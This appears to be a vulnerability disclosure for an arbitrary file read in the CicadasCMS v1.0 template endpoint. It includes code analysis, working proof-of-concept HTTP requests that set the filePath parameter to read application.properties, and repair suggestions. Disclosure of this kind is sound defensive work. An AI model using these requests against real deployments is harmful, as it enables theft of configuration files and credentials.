## Vulnerability Description

A security vulnerability exists in the template management module of CicadasCMS v1.0. The `/system/cms/template/input` interface fails to adequately filter and escape the user-inputted `filePath` parameter when processing template content reading logic. This allows attackers to input any file path existing on the system. The interface will then read the content of any file entered by the attacker and return it, resulting in an arbitrary file read vulnerability.
## Vulnerability Analysis

The entry point file for this vulnerability is: src/main/java/com/zhiliao/module/web/cms/TemplateController.java

The code logic on line 42 is: if(templateFile.getFilePath()null)throw new SystemException("Template path cannot be empty!");

It only checks if the value passed in `filePath` is empty; if it is not empty, it will continue to execute the logic layer `templateFileService.findByPath(`).

<img width="1355" height="626" alt="Pasted image 20260430100447" src="https://github.com/user-attachments/assets/83735414-b2ba-4037-a63b-5c95ee930e80" />


Logic layer class file: src/main/java/com/zhiliao/common/template/TemplateFileServiceImpl.java

The content of the templateFileService.findByPath() method is as follows:

The code doesn't perform any validation on the passed-in path; it only checks if the file exists (line 67: `if(!file.exists())`). It doesn't check if the passed-in file path is a template file before directly reading and returning its contents. Therefore, a vulnerability exists: it allows passing in any existing file path and reading arbitrary file contents.
<img width="1281" height="491" alt="Pasted image 20260430100820" src="https://github.com/user-attachments/assets/740a08e3-fc3b-408a-a172-ff1754b56e18" />



## Vulnerability Reproduction

Visit http://127.0.0.1:12345/system, click on System Management, then click on the Template Management module to view all template files.

<img width="1773" height="713" alt="Pasted image 20260430101358" src="https://github.com/user-attachments/assets/a9137fa0-c0ea-4025-835d-72d1db34361b" />



Click on one of the template files, for example, about.html.
<img width="1920" height="1009" alt="Pasted image 20260430101443" src="https://github.com/user-attachments/assets/749dfbd0-0d5d-4db6-b52c-4c0b494f5675" />


The following data package will be loaded:

```http
GET /system/cms/template/input?filePath=F:%5CPermeate%5CCodeAudit%5CJAVA%5CCicadasCMS-master%5CCicadasCms%5Ctarget%5Cclasses%5Ctemplates%5Cwww%5Cmobile%5Cabout.html&_=1777515270752 HTTP/1.1
Host: 127.0.0.1:12345
sec-ch-ua-platform: "Windows"
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN,zh;q=0.9
Accept: text/html, */*; q=0.01
sec-ch-ua: "Chromium";v="143", "Not A(Brand";v="24"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
sec-ch-ua-mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:12345/system
Accept-Encoding: gzip, deflate, br
Cookie: _session_=bG9jYWw6MTc0MTExMzE5NDk3MTE2OToxNzc3NTE5NzQ0MzEyOmFhZDE1NDQ1ZTFhMjFjY2RkNmZmODIzMzk3Njk0NTMwOTQxNDQzMDI0NjJiYjYyNDQ4OWIwYTBjMjlhMmExZjc; bjui_theme=blue; Hm_lvt_7d86eb847ecfd3c972fa457a6abaa0da=1777509084; Hm_lpvt_7d86eb847ecfd3c972fa457a6abaa0da=1777509084; HMACCOUNT=4DD525A11AE804E4; SESSION=a9f10e86-1ad0-4321-82db-2948b24dd5fd
Connection: keep-alive
```


<img width="1906" height="840" alt="Pasted image 20260430101512" src="https://github.com/user-attachments/assets/901e6f08-0bf8-4d9e-abc6-5971d936173b" />


Change the value of `filePath` to any file path you want to read. For example, to read the system configuration file: `F:\Permeate\CodeAudit\JAVA\CicadasCMS-master\CicadasCms\src\main\resources\application.properties`
<img width="1920" height="848" alt="Pasted image 20260430101659" src="https://github.com/user-attachments/assets/54141cb8-9751-4740-a72b-f55ae2987ac3" />



The constructed data packet is as follows:
```http
GET /system/cms/template/input?filePath=F:%5CPermeate%5CCodeAudit%5CJAVA%5CCicadasCMS-master%5CCicadasCms%5Csrc%5Cmain%5Cresources%5Capplication.properties&_=1777513166098 HTTP/1.1
Host: 127.0.0.1:12345
sec-ch-ua-platform: "Windows"
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN,zh;q=0.9
Accept: text/html, */*; q=0.01
sec-ch-ua: "Chromium";v="143", "Not A(Brand";v="24"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
sec-ch-ua-mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:12345/system
Accept-Encoding: gzip, deflate, br
Cookie: _session_=bG9jYWw6MTc0MTExMzE5NDk3MTE2OToxNzc3NTE5NzQ0MzEyOmFhZDE1NDQ1ZTFhMjFjY2RkNmZmODIzMzk3Njk0NTMwOTQxNDQzMDI0NjJiYjYyNDQ4OWIwYTBjMjlhMmExZjc; bjui_theme=blue; Hm_lvt_7d86eb847ecfd3c972fa457a6abaa0da=1777509084; Hm_lpvt_7d86eb847ecfd3c972fa457a6abaa0da=1777509084; HMACCOUNT=4DD525A11AE804E4; SESSION=a9f10e86-1ad0-4321-82db-2948b24dd5fd
Connection: keep-alive
```

The response was successful, displaying the contents of the application.properties configuration file. The arbitrary file content read vulnerability exists, vulnerability reproduction is complete.

<img width="1915" height="940" alt="Pasted image 20260430101836" src="https://github.com/user-attachments/assets/4f1ea13e-3d19-4194-ad9f-a7af26fafffb" />


## Repair suggestions

Path Normalization (Core): Use `getCanonicalPath()` to obtain the absolute canonical path of the input path and verify that the path starts with the preset template root directory, strictly prohibiting paths outside the specified folder.

Whitelist Mechanism: Only allow reading files with specific suffixes (e.g., `.html`, `.tpl`), and restrict the `filePath` parameter from containing dangerous characters such as `..`, `%00`, and `%2e`.

ID Mapping: The frontend requests using the template ID, and the backend matches the actual path from the database or configuration file based on the ID, avoiding directly passing the physical path in the interface.

Privilege Minimization: Ensure that the web service running account has no read permissions for sensitive system directories (e.g., `/etc/`, `/root/`).
